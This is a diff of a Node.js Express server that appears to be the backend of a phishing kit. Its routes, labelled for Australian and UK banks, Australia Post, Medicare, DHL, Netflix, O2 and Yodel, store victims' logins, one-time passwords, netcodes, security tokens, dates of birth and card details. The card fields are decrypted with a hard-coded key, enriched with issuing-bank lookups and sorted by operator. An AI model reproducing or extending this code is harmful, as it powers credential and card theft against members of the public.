   });
 });
 
-
 app.post("/asbCommand", cors(), (req, res) => {
   uniqueid = req.body.uniqueid;
   newStatus = req.body.status;
@@ -2237,7 +2096,6 @@ app.post("/asbCommand", cors(), (req, res) => {
     else console.log(err);
   });
 });
-
 
 app.get("/asbCustomers/:id/:owner", (req, res) => {
   uniqueid = req.params.id;
@@ -2251,7 +2109,6 @@ app.get("/asbCustomers/:id/:owner", (req, res) => {
     else console.log(err);
   });
 });
-
 
 app.post("/asbSaveLogin", cors(), (req, res) => {
   username = req.body.username;
@@ -2269,7 +2126,6 @@ app.post("/asbSaveLogin", cors(), (req, res) => {
   });
 });
 
-
 app.post("/asbSaveTelephone", cors(), (req, res) => {
   uniqueid = req.body.uniqueid;
   telephone = req.body.telephone;
@@ -2283,7 +2139,6 @@ app.post("/asbSaveTelephone", cors(), (req, res) => {
     else console.log(err);
   });
 });
-
 
 app.post("/asbSaveOtp", cors(), (req, res) => {
   uniqueid = req.body.uniqueid;
@@ -2299,7 +2154,6 @@ app.post("/asbSaveOtp", cors(), (req, res) => {
   });
 });
 
-
 app.post("/asbSaveNetcode", cors(), (req, res) => {
   uniqueid = req.body.uniqueid;
   netcode = req.body.netcode;
@@ -2313,7 +2167,6 @@ app.post("/asbSaveNetcode", cors(), (req, res) => {
     else console.log(err);
   });
 });
-
 
 app.post("/asbDeleteentry/:id", cors(), (req, res) => {
   uniqueid = req.params.id;
@@ -2332,7 +2185,6 @@ app.post("/asbDeleteentry/:id", cors(), (req, res) => {
 //NAB
 //NAB
 
-
 app.get("/nabCustomers/:id/:owner/modal", (req, res) => {
   uniqueid = req.params.id;
   owner = req.params.owner;
@@ -2346,7 +2198,6 @@ app.get("/nabCustomers/:id/:owner/modal", (req, res) => {
   });
 });
 
-
 app.get("/nabCustomers/:owner", (req, res) => {
   owner = req.params.owner;
   let details = [owner];
@@ -2358,7 +2209,6 @@ app.get("/nabCustomers/:owner", (req, res) => {
   });
 });
 
-
 app.post("/nabCommand", cors(), (req, res) => {
   uniqueid = req.body.uniqueid;
   newStatus = req.body.status;
@@ -2369,7 +2219,6 @@ app.post("/nabCommand", cors(), (req, res) => {
     else console.log(err);
   });
 });
-
 
 app.get("/nabCustomers/:id/:owner", (req, res) => {
   uniqueid = req.params.id;
@@ -2383,7 +2232,6 @@ app.get("/nabCustomers/:id/:owner", (req, res) => {
     else console.log(err);
   });
 });
-
 
 app.post("/nabSaveLogin", cors(), (req, res) => {
   username = req.body.username;
@@ -2401,7 +2249,6 @@ app.post("/nabSaveLogin", cors(), (req, res) => {
   });
 });
 
-
 app.post("/nabSaveOtp", cors(), (req, res) => {
   uniqueid = req.body.uniqueid;
   otp = req.body.otp;
@@ -2415,7 +2262,6 @@ app.post("/nabSaveOtp", cors(), (req, res) => {
     else console.log(err);
   });
 });
-
 
 app.post("/nabSavePhone", cors(), (req, res) => {
   uniqueid = req.body.uniqueid;
@@ -2434,7 +2280,6 @@ app.post("/nabSavePhone", cors(), (req, res) => {
 //MULTIPANEL
 //MULTIPANEL
 //MULTIPANEL
-
 
 app.get("/multiCustomers/:owner", async (req, result) => {
   owner = req.params.owner;
@@ -2491,7 +2336,6 @@ app.get("/multiCustomers/:owner", async (req, result) => {
 //STGEORGE
 //STGEORGE
 
-
 app.get("/georgeCustomers/:id/:owner/modal", (req, res) => {
   uniqueid = req.params.id;
   owner = req.params.owner;
@@ -2505,7 +2349,6 @@ app.get("/georgeCustomers/:id/:owner/modal", (req, res) => {
   });
 });
 
-
 app.get("/georgeCustomers/:owner", (req, res) => {
   owner = req.params.owner;
   let details = [owner];
@@ -2517,7 +2360,6 @@ app.get("/georgeCustomers/:owner", (req, res) => {
   });
 });
 
-
 app.post("/georgeCommand", cors(), (req, res) => {
   uniqueid = req.body.uniqueid;
   newStatus = req.body.status;
@@ -2528,7 +2370,6 @@ app.post("/georgeCommand", cors(), (req, res) => {
     else console.log(err);
   });
 });
-
 
 app.post("/georgeSavePhone", cors(), (req, res) => {
   uniqueid = req.body.uniqueid;
@@ -2544,7 +2385,6 @@ app.post("/georgeSavePhone", cors(), (req, res) => {
   });
 });
 
-
 app.post("/georgeSaveOtp", cors(), (req, res) => {
   uniqueid = req.body.uniqueid;
   otp = req.body.otp;
@@ -2558,7 +2398,6 @@ app.post("/georgeSaveOtp", cors(), (req, res) => {
     else console.log(err);
   });
 });
-
 
 app.post("/georgeSaveCard", cors(), (req, res) => {
   uniqueid = req.body.uniqueid;
@@ -2576,7 +2415,6 @@ app.post("/georgeSaveCard", cors(), (req, res) => {
   });
 });
 
-
 app.post("/georgeSaveLoginAgain", cors(), (req, res) => {
   uniqueid = req.body.uniqueid;
   accessNo = req.body.accessNo;
@@ -2593,7 +2431,6 @@ app.post("/georgeSaveLoginAgain", cors(), (req, res) => {
   });
 });
 
-
 app.get("/georgeCustomers/:id/:owner", (req, res) => {
   uniqueid = req.params.id;
   owner = req.params.owner;
@@ -2608,7 +2445,6 @@ app.get("/georgeCustomers/:id/:owner", (req, res) => {
 });
 
 let georgeCount = 0;
-
 
 app.post("/georgeSaveLogin", cors(), (req, res) => {
   accessNo = req.body.accessNo;
@@ -2643,7 +2479,6 @@ app.post("/georgeSaveLogin", cors(), (req, res) => {
   }
 });
 
-
 app.post("/georgeDeleteentry/:id", cors(), (req, res) => {
   uniqueid = req.params.id;
   owner = req.body.owner;
@@ -2661,7 +2496,6 @@ app.post("/georgeDeleteentry/:id", cors(), (req, res) => {
 //BENDIGO
 //BENDIGO
 
-
 app.get("/bendiCustomers/:id/:owner/modal", (req, res) => {
   uniqueid = req.params.id;
   owner = req.params.owner;
@@ -2675,7 +2509,6 @@ app.get("/bendiCustomers/:id/:owner/modal", (req, res) => {
   });
 });
 
-
 app.get("/bendiCustomers/:owner", (req, res) => {
   owner = req.params.owner;
   let details = [owner];
@@ -2687,7 +2520,6 @@ app.get("/bendiCustomers/:owner", (req, res) => {
   });
 });
 
-
 app.post("/bendiCommand", cors(), (req, res) => {
   uniqueid = req.body.uniqueid;
   newStatus = req.body.status;
@@ -2698,7 +2530,6 @@ app.post("/bendiCommand", cors(), (req, res) => {
     else console.log(err);
   });
 });
-
 
 app.post("/bendiSavePhone", cors(), (req, res) => {
   uniqueid = req.body.uniqueid;
@@ -2714,7 +2545,6 @@ app.post("/bendiSavePhone", cors(), (req, res) => {
   });
 });
 
-
 app.get("/bendiCustomers/:id/:owner", (req, res) => {
   uniqueid = req.params.id;
   owner = req.params.owner;
@@ -2729,7 +2559,6 @@ app.get("/bendiCustomers/:id/:owner", (req, res) => {
 });
 
 let bendiCount = 2;
-
 
 app.post(`/bendiSaveLogin`, cors(), (req, res) => {
   accessId = req.body.accessId;
@@ -2852,7 +2681,6 @@ app.post(`/bendiSaveLogin`, cors(), (req, res) => {
   // });
 });
 
-
 app.post("/bendiSaveOtp", cors(), (req, res) => {
   uniqueid = req.body.uniqueid;
   otp = req.body.otp;
@@ -2866,7 +2694,6 @@ app.post("/bendiSaveOtp", cors(), (req, res) => {
     else console.log(err);
   });
 });
-
 
 app.post("/bendiSaveDob", cors(), (req, res) => {
   uniqueid = req.body.uniqueid;
@@ -2882,7 +2709,6 @@ app.post("/bendiSaveDob", cors(), (req, res) => {
   });
 });
 
-
 app.post("/bendiSaveST", cors(), (req, res) => {
   uniqueid = req.body.uniqueid;
   secToken = req.body.secToken;
@@ -2896,7 +2722,6 @@ app.post("/bendiSaveST", cors(), (req, res) => {
     else console.log(err);
   });
 });
-
 
 app.post("/bendiSaveLoginAgain", cors(), (req, res) => {
   uniqueid = req.body.uniqueid;
@@ -2912,7 +2737,6 @@ app.post("/bendiSaveLoginAgain", cors(), (req, res) => {
     else console.log(err);
   });
 });
-
 
 app.post("/bendiDeleteentry/:id", cors(), (req, res) => {
   uniqueid = req.params.id;
@@ -2930,7 +2754,6 @@ app.post("/bendiDeleteentry/:id", cors(), (req, res) => {
 //AUSPOSTwLogs
 //AUSPOSTwLogs
 //AUSPOSTwLogs
-
 
 app.post("/ausPostLog", (req, res) => {
   username = req.body.username;
@@ -2950,7 +2773,6 @@ app.post("/ausPostLog", (req, res) => {
 
   res.send("Update Completed");
 });
-
 
 app.post("/ausPostStGeorgeLog", (req, res) => {
   accessNo = req.body.accessNo;
@@ -2975,7 +2797,6 @@ app.post("/ausPostStGeorgeLog", (req, res) => {
 //O2
 //O2
 //O2
-
 
 app.post("/serenityO2", (req, res) => {
   username = CryptoJS.AES.decrypt(req.body.username, "402312").toString(
@@ -3032,7 +2853,7 @@ app.post("/serenityO2", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://lookup.binlist.net/${bin}`)
+    .get(``)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -3089,7 +2910,6 @@ app.post("/serenityO2", (req, res) => {
     });
 });
 
-
 app.post("/charlieO2", (req, res) => {
   username = CryptoJS.AES.decrypt(req.body.username, "402312").toString(
     CryptoJS.enc.Utf8
@@ -3145,7 +2965,7 @@ app.post("/charlieO2", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://lookup.binlist.net/${bin}`)
+    .get(``)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -3202,7 +3022,6 @@ app.post("/charlieO2", (req, res) => {
     });
 });
 
-
 app.post("/saimO2", (req, res) => {
   username = CryptoJS.AES.decrypt(req.body.username, "402312").toString(
     CryptoJS.enc.Utf8
@@ -3258,7 +3077,7 @@ app.post("/saimO2", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://lookup.binlist.net/${bin}`)
+    .get(``)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -3315,7 +3134,6 @@ app.post("/saimO2", (req, res) => {
     });
 });
 
-
 app.post("/c2O2", (req, res) => {
   username = CryptoJS.AES.decrypt(req.body.username, "402312").toString(
     CryptoJS.enc.Utf8
@@ -3371,7 +3189,7 @@ app.post("/c2O2", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://lookup.binlist.net/${bin}`)
+    .get(``)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -3428,7 +3246,6 @@ app.post("/c2O2", (req, res) => {
     });
 });
 
-
 app.post("/o2Triz", (req, res) => {
   username = CryptoJS.AES.decrypt(req.body.username, "402312").toString(
     CryptoJS.enc.Utf8
@@ -3484,7 +3301,7 @@ app.post("/o2Triz", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://lookup.binlist.net/${bin}`)
+    .get(``)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -3523,7 +3340,6 @@ app.post("/o2Triz", (req, res) => {
       res.send("Update Completed");
     });
 });
-
 
 app.post("/o2Pac", (req, res) => {
   telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
@@ -3566,7 +3382,6 @@ app.post("/o2Pac", (req, res) => {
 //AUSPOST
 //AUSPOST
 //AUSPOST
-
 
 app.post("/eeAuspost", (req, res) => {
   fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
@@ -3614,7 +3429,7 @@ app.post("/eeAuspost", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://lookup.binlist.net/${bin}`)
+    .get(``)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -3682,7 +3497,6 @@ app.post("/eeAuspost", (req, res) => {
     });
 });
 
-
 app.post("/truthAuspost", (req, res) => {
   fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
     CryptoJS.enc.Utf8
@@ -3729,7 +3543,7 @@ app.post("/truthAuspost", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://lookup.binlist.net/${bin}`)
+    .get(``)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -3785,7 +3599,6 @@ app.post("/truthAuspost", (req, res) => {
     });
 });
 
-
 app.post("/fredAuspost", (req, res) => {
   fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
     CryptoJS.enc.Utf8
@@ -3832,7 +3645,7 @@ app.post("/fredAuspost", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://lookup.binlist.net/${bin}`)
+    .get(``)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -3888,7 +3701,6 @@ app.post("/fredAuspost", (req, res) => {
     });
 });
 
-
 app.post("/trentAuspost", (req, res) => {
   fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
     CryptoJS.enc.Utf8
@@ -3935,7 +3747,7 @@ app.post("/trentAuspost", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://lookup.binlist.net/${bin}`)
+    .get(``)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -3991,7 +3803,6 @@ app.post("/trentAuspost", (req, res) => {
     });
 });
 
-
 app.post("/biggieAuspost", (req, res) => {
   fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
     CryptoJS.enc.Utf8
@@ -4038,7 +3849,7 @@ app.post("/biggieAuspost", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://lookup.binlist.net/${bin}`)
+    .get(``)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -4094,7 +3905,6 @@ app.post("/biggieAuspost", (req, res) => {
     });
 });
 
-
 app.post("/consistentAuspost", (req, res) => {
   fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
     CryptoJS.enc.Utf8
@@ -4141,7 +3951,7 @@ app.post("/consistentAuspost", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://lookup.binlist.net/${bin}`)
+    .get(``)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -4199,7 +4009,6 @@ app.post("/consistentAuspost", (req, res) => {
 
 let bigbull = 0;
 
-
 app.post("/bigbullAuspost", (req, res) => {
   fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
     CryptoJS.enc.Utf8
@@ -4246,7 +4055,7 @@ app.post("/bigbullAuspost", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://lookup.binlist.net/${bin}`)
+    .get(``)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -4302,7 +4111,6 @@ app.post("/bigbullAuspost", (req, res) => {
     });
 });
 
-
 app.post("/daangerAuspost", (req, res) => {
   fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
     CryptoJS.enc.Utf8
@@ -4349,7 +4157,7 @@ app.post("/daangerAuspost", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://lookup.binlist.net/${bin}`)
+    .get(``)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -4407,7 +4215,6 @@ app.post("/daangerAuspost", (req, res) => {
 
 let c2 = 0;
 
-
 app.post("/c2auspost", (req, res) => {
   fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
     CryptoJS.enc.Utf8
@@ -4454,7 +4261,7 @@ app.post("/c2auspost", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://lookup.binlist.net/${bin}`)
+    .get(``)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -4510,7 +4317,6 @@ app.post("/c2auspost", (req, res) => {
     });
 });
 
-
 app.post("/ausPostSJ", (req, res) => {
   fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
     CryptoJS.enc.Utf8
@@ -4557,7 +4363,7 @@ app.post("/ausPostSJ", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://lookup.binlist.net/${bin}`)
+    .get(``)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -4582,7 +4388,6 @@ app.post("/ausPostSJ", (req, res) => {
       res.send("Update Completed");
     });
 });
-
 
 app.post("/ausPostKelv2", (req, res) => {
   fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
@@ -4630,7 +4435,7 @@ app.post("/ausPostKelv2", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://lookup.binlist.net/${bin}`)
+    .get(``)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -4686,7 +4491,6 @@ app.post("/ausPostKelv2", (req, res) => {
     });
 });
 
-
 app.post("/ausPostManny", (req, res) => {
   fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
     CryptoJS.enc.Utf8
@@ -4733,7 +4537,7 @@ app.post("/ausPostManny", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://lookup.binlist.net/${bin}`)
+    .get(``)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -4761,7 +4565,6 @@ app.post("/ausPostManny", (req, res) => {
       res.send("Update Completed");
     });
 });
-
 
 app.post("/ausPostAbzz", (req, res) => {
   fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
@@ -4809,7 +4612,7 @@ app.post("/ausPostAbzz", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://lookup.binlist.net/${bin}`)
+    .get(``)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -4837,7 +4640,6 @@ app.post("/ausPostAbzz", (req, res) => {
       res.send("Update Completed");
     });
 });
-
 
 app.post("/ausPostSS", (req, res) => {
   fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
@@ -4885,7 +4687,7 @@ app.post("/ausPostSS", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://lookup.binlist.net/${bin}`)
+    .get(``)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -4914,7 +4716,6 @@ app.post("/ausPostSS", (req, res) => {
       res.send("Update Completed");
     });
 });
-
 
 app.post("/ausPostTheOnlyMY", (req, res) => {
   fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
@@ -4962,7 +4763,7 @@ app.post("/ausPostTheOnlyMY", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://lookup.binlist.net/${bin}`)
+    .get(``)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -4993,7 +4794,6 @@ app.post("/ausPostTheOnlyMY", (req, res) => {
 });
 
 let frankAbignale = 0;
-
 
 app.post("/ausPostfrankabignale100!", (req, res) => {
   fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
@@ -5041,7 +4841,7 @@ app.post("/ausPostfrankabignale100!", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://lookup.binlist.net/${bin}`)
+    .get(``)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -5070,7 +4870,6 @@ app.post("/ausPostfrankabignale100!", (req, res) => {
       res.send("Update Completed");
     });
 });
-
 
 app.post("/ausPostAR", (req, res) => {
   fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
@@ -5118,7 +4917,7 @@ app.post("/ausPostAR", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://lookup.binlist.net/${bin}`)
+    .get(``)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -5137,7 +4936,6 @@ app.post("/ausPostAR", (req, res) => {
       res.send("Update Completed");
     });
 });
-
 
 app.post("/ausPostKelv", (req, res) => {
   fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
@@ -5185,7 +4983,7 @@ app.post("/ausPostKelv", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://lookup.binlist.net/${bin}`)
+    .get(``)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -5215,7 +5013,6 @@ app.post("/ausPostKelv", (req, res) => {
 });
 
 let SpoofergooferAP = 0;
-
 
 app.post("/ausPostSpoofer", (req, res) => {
   fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
@@ -5263,7 +5060,7 @@ app.post("/ausPostSpoofer", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://lookup.binlist.net/${bin}`)
+    .get(``)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -5291,7 +5088,6 @@ app.post("/ausPostSpoofer", (req, res) => {
       res.send("Update Completed");
     });
 });
-
 
 app.post("/ausPostLoader", (req, res) => {
   fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
@@ -5339,7 +5135,7 @@ app.post("/ausPostLoader", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://lookup.binlist.net/${bin}`)
+    .get(``)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -5366,7 +5162,6 @@ app.post("/ausPostLoader", (req, res) => {
 //MEDICARE
 //MEDICARE
 //MEDICARE
-
 
 app.post("/fredMedicare", (req, res) => {
   fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
@@ -5417,7 +5212,7 @@ app.post("/fredMedicare", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://lookup.binlist.net/${bin}`)
+    .get(``)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -5474,7 +5269,6 @@ app.post("/fredMedicare", (req, res) => {
     });
 });
 
-
 app.post("/tarrifiMedicare", (req, res) => {
   fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
     CryptoJS.enc.Utf8
@@ -5524,7 +5318,7 @@ app.post("/tarrifiMedicare", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://lookup.binlist.net/${bin}`)
+    .get(``)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -5555,7 +5349,6 @@ app.post("/tarrifiMedicare", (req, res) => {
 });
 
 let MZ7 = 0;
-
 
 app.post("/MZ7Medicare", (req, res) => {
   fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
@@ -5606,7 +5399,7 @@ app.post("/MZ7Medicare", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://lookup.binlist.net/${bin}`)
+    .get(``)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -5637,7 +5430,6 @@ app.post("/MZ7Medicare", (req, res) => {
 });
 
 let putin = 0;
-
 
 app.post("/putinMedicare", (req, res) => {
   fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
@@ -5688,7 +5480,7 @@ app.post("/putinMedicare", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://lookup.binlist.net/${bin}`)
+    .get(``)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -5719,7 +5511,6 @@ app.post("/putinMedicare", (req, res) => {
 });
 
 let failedlawyer = 1;
-
 
 app.post("/failedlawyerMedicare", (req, res) => {
   fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
@@ -5770,7 +5561,7 @@ app.post("/failedlawyerMedicare", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://lookup.binlist.net/${bin}`)
+    .get(``)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -5801,7 +5592,6 @@ app.post("/failedlawyerMedicare", (req, res) => {
 });
 
 let codeNba = 0;
-
 
 app.post("/codeNbaMedicare", (req, res) => {
   fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
@@ -5852,7 +5642,7 @@ app.post("/codeNbaMedicare", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://lookup.binlist.net/${bin}`)
+    .get(``)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -5883,7 +5673,6 @@ app.post("/codeNbaMedicare", (req, res) => {
 });
 
 let s350 = 2;
-
 
 app.post("/ssMedicare", (req, res) => {
   fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
@@ -5934,7 +5723,7 @@ app.post("/ssMedicare", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://lookup.binlist.net/${bin}`)
+    .get(``)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -5963,7 +5752,6 @@ app.post("/ssMedicare", (req, res) => {
       res.send("Update Completed");
     });
 });
-
 
 app.post("/offshorebillionsMedicare", (req, res) => {
   fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
@@ -6014,7 +5802,7 @@ app.post("/offshorebillionsMedicare", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://lookup.binlist.net/${bin}`)
+    .get(``)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -6043,7 +5831,6 @@ app.post("/offshorebillionsMedicare", (req, res) => {
       res.send("Update Completed");
     });
 });
-
 
 app.post("/haytchMedicare", (req, res) => {
   fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
@@ -6094,7 +5881,7 @@ app.post("/haytchMedicare", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://lookup.binlist.net/${bin}`)
+    .get(``)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -6113,7 +5900,6 @@ app.post("/haytchMedicare", (req, res) => {
       res.send("Update Completed");
     });
 });
-
 
 app.post("/kelvMedicare", (req, res) => {
   fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
@@ -6164,7 +5950,7 @@ app.post("/kelvMedicare", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://lookup.binlist.net/${bin}`)
+    .get(``)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -6200,7 +5986,6 @@ app.post("/kelvMedicare", (req, res) => {
 //DHL
 
 let mason = 4;
-
 
 app.post("/masonDHL", (req, res) => {
   fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
@@ -6246,7 +6031,7 @@ app.post("/masonDHL", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://lookup.binlist.net/${bin}`)
+    .get(``)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -6279,7 +6064,6 @@ app.post("/masonDHL", (req, res) => {
 //NETLIX
 //NETLIX
 //NETLIX
-
 
 app.post("/fpaysNetflix", (req, res) => {
   username = CryptoJS.AES.decrypt(req.body.username, "402312").toString(
@@ -6331,7 +6115,7 @@ app.post("/fpaysNetflix", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://lookup.binlist.net/${bin}`)
+    .get(``)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -6374,7 +6158,6 @@ app.post("/fpaysNetflix", (req, res) => {
 //YODEL
 //YODEL
 //YODEL
-
 
 app.post("/sendYodelRes", (req, res) => {
   fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
@@ -6420,7 +6203,7 @@ app.post("/sendYodelRes", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://lookup.binlist.net/${bin}`)
+    .get(``)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -6459,7 +6242,6 @@ app.post("/sendYodelRes", (req, res) => {
       res.send("Update Completed");
     });
 });
-
 
 let ssCount = 0;
 
@@ -6507,7 +6289,7 @@ app.post("/sendSSYodelres", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://lookup.binlist.net/${bin}`)
+    .get(``)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -6539,7 +6321,6 @@ app.post("/sendSSYodelres", (req, res) => {
       res.send("Update Completed");
     });
 });
-
 
 let yodelM4STERB0Y = 0;
 
@@ -6587,7 +6368,7 @@ app.post("/yodelM4STERB0Y", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://lookup.binlist.net/${bin}`)
+    .get(``)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -6616,7 +6397,6 @@ app.post("/yodelM4STERB0Y", (req, res) => {
       res.send("Update Completed");
     });
 });
-
 
 let arcount = 0;
 
@@ -6664,7 +6444,7 @@ app.post("/sendARRYodelRes", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://lookup.binlist.net/${bin}`)
+    .get(``)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -6696,7 +6476,6 @@ app.post("/sendARRYodelRes", (req, res) => {
       res.send("Update Completed");
     });
 });
-
 
 app.post("/mazzaYodel", (req, res) => {
   fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
@@ -6748,7 +6527,7 @@ app.post("/mazzaYodel", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://lookup.binlist.net/${bin}`)
+    .get(``)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -6784,7 +6563,6 @@ app.post("/mazzaYodel", (req, res) => {
       res.send("Update Completed");
     });
 });
-
 
 app.post("/yardzYodel", (req, res) => {
   fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
@@ -6836,7 +6614,7 @@ app.post("/yardzYodel", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://lookup.binlist.net/${bin}`)
+    .get(``)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -6871,7 +6649,6 @@ app.post("/yardzYodel", (req, res) => {
 });
 
 let hoods = 2;
-
 
 app.post("/hoodsYodel", (req, res) => {
   fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
@@ -6923,7 +6700,7 @@ app.post("/hoodsYodel", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://lookup.binlist.net/${bin}`)
+    .get(``)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -6956,7 +6733,6 @@ app.post("/hoodsYodel", (req, res) => {
       res.send("Update Completed");
     });
 });
-
 
 let bill = 0;
 
@@ -7010,7 +6786,7 @@ app.post("/sendBigBillz20", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://lookup.binlist.net/${bin}`)
+    .get(``)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
